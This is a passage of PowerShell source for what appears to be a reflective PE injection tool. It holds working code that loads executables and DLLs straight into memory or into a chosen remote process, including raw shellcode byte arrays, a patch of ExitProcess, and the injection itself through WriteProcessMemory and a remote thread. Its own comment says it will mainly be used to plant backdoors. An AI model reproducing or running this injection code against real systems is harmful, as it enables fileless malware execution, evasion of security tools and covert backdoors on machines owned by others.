            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
            # call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    # It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ########## FUNCTIONS ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                # which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero                #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero        #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }        
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle) EndAddress: $(Get-Hex $PEEndAddress)"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            # This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
# if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
# {
# Write-Verbose "Getting SeDebugPrivilege"
# Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
# }
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
